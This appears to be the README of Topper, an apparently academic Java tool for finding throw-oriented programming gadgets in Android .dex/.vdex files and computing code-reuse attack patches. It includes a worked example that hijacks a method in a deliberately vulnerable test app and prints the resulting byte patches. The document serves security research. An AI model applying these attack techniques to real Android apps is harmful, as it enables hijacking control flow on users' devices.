# Topper

*Topper* aims to support performing bytecode - based attacks on Android. For now, *Topper* enables loading `.dex` and `.vdex` files, extracting *TOP gadgets* and performing *TOP attacks*. Also, a few information gathering commands are implemented to prevent tool - hopping.

## Project Setup

*Topper* is fully implemented using Java and Maven. As this repo is based on an Eclipse project, one may be able to directly import it as such.

The following is an overview of this project.
| Components | Description |
| :---: | :---: |
| [Source](https://github.com/fkie-cad/Topper/tree/main/Topper/src/main/java/com/topper) | Java source code of Topper. |
| [Testing](https://github.com/fkie-cad/Topper/tree/main/Topper/src/test/java/com/topper/tests) | Unit and integration tests for critical Topper components. |
| [Resources](https://github.com/fkie-cad/Topper/tree/main/Topper/src/test/java/resources) | Resources used for testing. `base.vdex` is also used throughout the introduction. |

## Building jar File in Eclipse

In order to produce a `.jar` file, simply perform a `maven install` operation.

For eclipse:
1. Right-click on the imported project.
2. Select `Run As > Maven install`.
3. Hope that all tests pass. Testing may take a while, depending on how fast `Jazzer` is.
4. Go to your eclipse project directory and run `cd ./target`.
5. Run topper with `java -jar ./Topper-<version>-jar-with-dependencies.jar --config ../config.xml`.

This should fire up an *interactive* Topper shell. There also exists a *non - interactive* mode. Type `help` for an overview of all the commands supported.

## Using Topper

Topper provides an *interactive* and *non - interactive* mode, the latter being almost equivalent to the former, except for requiring a script file.

To get an overview of what command line arguments are supported, run:
```
$ java -jar ./Topper-<version>-jar-with-dependencies --help
Usage: topper [-hV] -c=CONFIG [-s=SCRIPT]
  -c, --config=CONFIG   path to .xml configuration file to use
  -h, --help            Show this help message and exit.
  -s, --script=SCRIPT   path to script file to run in non-interactive mode
  -V, --version         Print version information and exit.
```

Using `-s`, one may provide a script file, whose lines consist of individual Topper commands also available in *interactive* mode. From this point onwards, only the *interactive* mode is discussed.

In *interactive* mode, the following command overview is given:
```
> help
 -  PicocliCommands registry
Summary: attack Computes an attack to use on the loaded file given special assumptions.
         exit   Terminates this process.
         file   Loads a given file from file system and parses it.
         help   
         list   Lists requested, file-related resources.
         search Searches for a regular expression in the string representation of all extracted
```

### Configuration

Topper is partially configurable by providing a `.xml` file. The file **must** specify the following (child) elements:
- `general`: Applies to more than one component of Topper.
    - `defaultAmountThreads`: If multi - threading is used, then this element will determine the amount of threads to use, unless there exist other means to determine the number of threads.
- `staticAnalyser`: Configures the static analysis stage that is part of the decompilation pipeline.
    - `skipCFG`: Determines whether to skip *CFG* extraction. As of the latest version, Topper does not use the *CFG*.
    - `skipDFG`: Determines whether to skip *DFG* extraction. As of the latest version, Topper does not implement *DFG* extraction.
- `sweeper`: Configures the sweeper, which is used to identify and decompile dex bytecode instructions.
    - `maxNumberInstructions`: Upper bound on the number of instructions (including pivot like `throw`) to consider when sweeping.
    - `pivotOpcode`: Case-insensitive string representation of the instruction to identify as pivot instruction. With *TOP*, the pivot instruction is `throw`. With *ROP*, the pivot instruction is `ret` (just an example; Topper does not work with *ROP*).
- `decompiler`: Configures the decompiler used by the sweeper to decompile bytes into bytecode instructions.
    - `dexSkipThreshold`: File size threshold for `.dex` files in a `.vdex` file. If a `.dex` file in a `.vdex` file exceeds this threshold, it will not be analysed. A value of `0` results in all `.dex` files to be ignored. A negative value indicates to consider all `.dex` files.
    - `dexVersion`: Version of `.dex` files. This mainly affects the byte -> opcode mapping.
    - `shouldNopUnknownInstructions`: Determines whether to NOP out unknown instructions. It depends on the interpreter, whether unknown instructions are simply skipped or not. To be safe, set this to `false`.

Consider [`config.xml`](https://github.com/fkie-cad/Topper/blob/main/Topper/config.xml) for a default configuration file.

### Loading Files

Topper can be regarded as a *static analysis tool*. It operates on files loaded with the `file` command like so:
```
> file --file ../src/test/java/resources/base.vdex --type VDEX
...
base.vdex> 
```
There may be logging output related to `SLF4J`, which can be ignored. In a nutshell, this warning keeps occurring and does not want to be removed...

As of the latest version, one must specify the type of the file explicitly. Technically, parsing magic bytes may suffice to relieve the user of this burden. However, later versions of Topper may want to consider special file structures in e.g. `.dex` and `.vdex` when decompiling bytes into code. In contrast to that, it may be beneficial to decompile an entire e.g. `base.vdex` file, as interpreters like `nterp` do not care whether bytecode is marked as executable or not.

A file may be of the following types, each resulting in slightly different parsing:
- `DEX`: Interpret given file as a `.dex` file.
- `VDEX`: Interpret given file as a `.vdex` file, which contains at least one `.dex` file. If not, an error is thrown.
- `RAW`: Interpret given file as a raw file, ignoring any file structure.
Gadget extraction still applies to the entire file, regardless of the file type. However, `RAW` files do not support listing methods and types.

### Searching TOP Gadgets

One of Toppers major functionalities is TOP gadget search.
```
base.vdex> search --help
Searches for a regular expression in the string representation of all extracted
gadgets.
  -h, --help                Show this help message and exit.
  -l, --lower=LOWER_BOUND   Lower bound for gadget length matching given regex.
                              Negative values are ignored.
  -r, --regex=REGEX         Regular expression to use while searching through
                              the gadgets.
  -u, --upper=UPPER_BOUND   Upper bound for gadget length matching given regex.
                              Non - positive values are ignored.
  -V, --version             Print version information and exit.
```

The regular expressions are Java 8 regex expressions. Consider the following example searching for TOP gadgets that end with a `throw v0`:
```
> file --file ../src/test/java/resources/base.vdex --type VDEX
base.vdex> search --lower 1 --upper 1 --regex "THROW v0$"
...
Entry: 0x594094
0000: 27 00 THROW v0
...
Entry: 0x5941b4
0000: 27 00 THROW v0
...
Entry: 0x594390
0000: 27 00 THROW v0
...
Entry: 0x5945b4
0000: 27 00 THROW v0
...
```
The `Entry` specifies the offset of the first byte of a TOP gadget relative to the beginning of the loaded file. As instruction sizes are always a multiple of a code unit (i.e. 2 bytes), these offsets will always be even. Topper uses the `pivotOpcode` from the configuration file to determine the last instruction of a TOP gadget. `lower` and `upper` describe lower and upper bounds on the number of instructions allowed in a single gadget, respectively, including the `pivotOpcode`.

### Listing Types and Methods

In order to ease target method and exception type identification, Topper provides functionality to list methods and types of `.dex` files via the `list` command.
```
base.vdex> list --help
Usage:  list [-hV] [COMMAND]
Lists requested, file-related resources.
  -h, --help      Show this help message and exit.
  -V, --version   Print version information and exit.
Commands:
  methods  Lists information on methods provided by loaded file(s).
  types    Lists all types of the loaded file.
```

For example, in order to find a method named `isConnected` in `base.vdex`, run:
```
base.vdex> list methods --regex "isConnected"
[Offset = 0x68]: classes0.dex
  [Index = 0x2edb, Offset = 0x13c518]: public boolean androidx/constraintlayout/core/widgets/ConstraintAnchor::isConnected()
[Offset = 0x57ee40]: classes4.dex
  [Index = 0x17, Offset = 0xf4c]: public boolean com/damnvulnerableapp/networking/communication/client/Client::isConnected()
  [Index = 0x2d, Offset = 0x0]: public abstract boolean com/damnvulnerableapp/networking/communication/client/EndPoint::isConnected()
  [Index = 0x3d, Offset = 0x1428]: public boolean com/damnvulnerableapp/networking/communication/client/NetworkEndPoint::isConnected()
```
The output is divided into `classes<N>.dex`, i.e. grouped by `.dex` files in the `.vdex` file that have a method with a matching name. Offsets of `classes<N>.dex` are relative to the beginning of the `.vdex` file, whereas offsets of methods are relative to the containing `.dex` file. The `index` value denotes the index of the method in the `method_ids` section, i.e. this index may be used by instructions like `invoke-*` to call the corresponding method in the context of the `.dex` file.

Similarly, types may be listed:
```
base.vdex> list types --regex "IOException"
[Offset = 0x68]: classes0.dex
  [Index = 0x1004]: java/io/IOException
[Offset = 0x57ee40]: classes4.dex
  [Index = 0x29]: java/io/IOException
[Offset = 0x585420]: classes7.dex
  [Index = 0x2d]: java/io/IOException
```
This time, `index` describes the index of a corresponding type wrt. the type section of the current `.dex` file.

### Generating a TOP Attack

With the above examples, Topper can be used to generate a *Classical TOP* attack.
```
base.vdex> attack --help
Usage:  attack [-hV] [COMMAND]
Computes an attack to use on the loaded file given special assumptions.
  -h, --help      Show this help message and exit.
  -V, --version   Print version information and exit.
Commands:
  ctop  Computes a list of patches to apply to the loaded file to achieve
          gadget chain execution.
```
As of the latest version of Topper, `ctop` is the only implemented bytecode reuse attack. It is noteworthy that `ctop` is not a pure *reuse* attack, as it requires injection of an exception handler and gadget dispatcher.

Generation of `ctop` attacks is highly configurable:
```
base.vdex> attack ctop --help
Usage:  attack ctop [-huvV] [-a=ALIGNMENT] [-e=EXCEPTION_VREG_INDEX]
                    -m=METHOD_OFFSET [-p=PC_VREG_INDEX] -t=EXCEPTION_TYPE_INDEX
                    [-x=METHOD_HANDLER_PADDING] [-y=HANDLE_DISPATCHER_PADDING]
                    -g=GADGETS[,GADGETS...]... [-g=GADGETS[,GADGETS...]...]...
Computes a list of patches to apply to the loaded file to achieve gadget chain
execution.
  -a, --alignment=ALIGNMENT
                  Determines the alignment to use for describing the patches.
                    Patch data is always divisible by alignment and refers to
                    an aligned offset. Useful for Write - What - Where
                    conditions with fixed - sized writes (qword,...).
  -e, --exception-vreg-index=EXCEPTION_VREG_INDEX
                  Virtual register used for storing the exception object. E.g.
                    "v0" needs "-v 0" etc. This dictates what gadgets are
                    eligible for manipulating the control flow.
  -g, --gadgets=GADGETS[,GADGETS...]...
                  Ordered list of gadget offsets relative to the loaded file's
                    base (often base.vdex).
  -h, --help      Show this help message and exit.
  -m, --method-offset=METHOD_OFFSET
                  Offset of the method to patch relative to the loaded file's
                    base (often base.vdex).
  -p, --pc-vreg-index=PC_VREG_INDEX
                  Virtual register used for storing the virtual program
                    counter. It dictates what gadget is executed next using a
                    dispatcher.
  -t, --exception-type-index=EXCEPTION_TYPE_INDEX
                  Type index of the exception type to instantiate and use for
                    throwing. The type is relative to the .dex file used to
                    execute the hijacked method.
  -u, --tuple     Determines whether to write the patches in form of an
                    offset-bytes tuple list usable in python.
  -v, --verbose   Enables verbosity mode that shows details on current
                    execution state of this command.
  -V, --version   Print version information and exit.
  -x, --method-handler-padding=METHOD_HANDLER_PADDING
                  Padding bytes to introduce between the end of the target
                    method and the encoded exception handler (4-byte aligned).
  -y, --handler-dispatcher-padding=HANDLE_DISPATCHER_PADDING
                  Padding bytes to introduce between the encoded exception
                    handler and the actual dispatcher code (4-byte aligned).
```

Consider the following example, which uses all the information gathered in the previous sections! The goal is to hijack `NetworkEndPoint::isConnected` located in `classes4.dex` and use an `IOException` object for moving between TOP gadgets and dispatcher.
```
base.vdex> attack ctop -m 0x580268 -t 0x29 -g 0x594094, 0x5941b4, 0x594390, 0x5945b4 -x 0x100
Computed Patches:
[0x5803c0] = \x22\x00\x29\x00\x12\xf1\xd8\x01\x01\x01\x2b\x01\x03\x00\x00\x00\x00\x01\x04\x00\x00\x00\x00\x00\x65\x9e\x00\x00\xf5\x9e\x00\x00\xe3\x9f\x00\x00\xf5\xa0\x00\x00
[0x5803a0] = \x00\x00\x00\x00\xff\xff\x01\x00\x01\x00\xa7\x01\x90\x00\x00\x00
[0x580270] = \x9c\x1a\x00\x00\x94\x00\x00\x00
[0x580268] = \x02\x00\x01\x00\x01\x00\x01\x00
[0x580278] = \x29\x00\xa4\x00\x6e\x10\x70\x00
```
Notice that `-x 0x100` is determined by trial and error. This padding accounts for the fact that `NetworkEndPoint::isConnected` is followed by a method that is called at least once during patching, which interferes with the installation of the exception handler.

The `base.vdex` file used throughout this introduction is a re-compiled version of [EEVA](https://github.com/fkie-cad/eeva). As it turns out, `NetworkEndPoint::isConnected` is called at least once per message sent and received, implying that this is a *hot* method (but apparently not *hot* enough to be JIT - compiled). 
